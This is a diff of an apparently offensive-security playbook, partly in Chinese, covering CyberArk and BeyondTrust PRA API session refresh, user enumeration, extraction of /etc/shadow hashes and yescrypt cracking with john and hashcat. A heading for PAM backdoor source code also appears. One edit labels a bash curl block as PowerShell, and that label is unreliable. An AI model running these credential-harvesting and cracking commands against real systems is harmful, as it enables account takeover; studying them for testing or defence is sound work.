@@ -198,7 +198,7 @@ curl -sk -i -X POST -H 'Content-Type: application/json' \
 
 ### Persist the Session
 
-```bash
+```powershell
 # CyberArk tokens expire (default 30 min idle). Refresh via /Session/Refresh.
 curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
   https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Session/Refresh
@@ -861,7 +861,7 @@ curl -sk -b cookies.txt https://REPLACE_WITH_YOUR_PRA_HOST/api/users | jq .
 # List every user (requires admin API scope)
 curl -sk -H "Authorization: Bearer $BT_TOKEN" \
   https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/users | \
-  jq '.Users[] | {UserId, CommonName, UserName, UserGroup}
+  jq '.Users[] | {UserId, CommonName, UserName, UserGroup}'
 ```
 
 ### Enumerate Managed Systems (Assets)
@@ -2483,7 +2483,7 @@ sudo grep username /etc/shadow | cut -d: -f2 | cut -d'$' -f2
 
 **破解兼容性**：
 - `john` 1.9.0-jumbo-1 对 yescrypt 支持有限（部分版本不加载）
-- `hashcat` 需 yescrypt mode（新版 hashcat 6.2.6+）
+- `hashcat` 需 yescrypt mode（hashcat 7.x+；yescrypt 自 6.2.6 起支持）
 - **建议**：提取后用 `john --format=yescrypt` 或升级 hashcat
 
 ### PAM 后门完整 C 源码 (F-PAM-002)
